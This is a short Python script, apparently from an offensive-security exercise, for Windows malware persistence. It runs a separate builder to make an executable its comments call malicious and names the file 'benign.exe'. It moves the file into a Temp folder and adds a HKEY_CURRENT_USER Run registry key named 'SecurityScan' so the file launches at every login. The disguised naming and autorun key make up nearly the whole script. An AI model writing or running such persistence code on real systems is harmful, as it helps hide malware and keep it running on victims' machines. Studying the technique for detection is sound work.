import os, shutil, winreg

filedir = os.path.join(os.getcwd(),"Temp")
filename = "benign.exe"
filepath = os.path.join(filedir,filename)

if os.path.isfile(filepath):
    os.remove(filepath)

# Use BuildExe to create malicious executable
os.system("python BuildExe.py")

# Move malicious executable to desired directory
shutil.move(filename,filedir)


# Windows default autorun keys:
reghive = winreg.HKEY_CURRENT_USER
# HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
# regpath = "SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
# HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce
# regpath = "SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"

# reghive = winreg.HKEY_LOCAL_MACHINE
# HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
regpath = "SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
# HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce
# regpath = "SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"


# Add registry autorun key
key = winreg.OpenKey(reghive,regpath,0,access=winreg.KEY_WRITE)
winreg.SetValueEx(key,"SecurityScan",0,winreg.REG_SZ,filepath)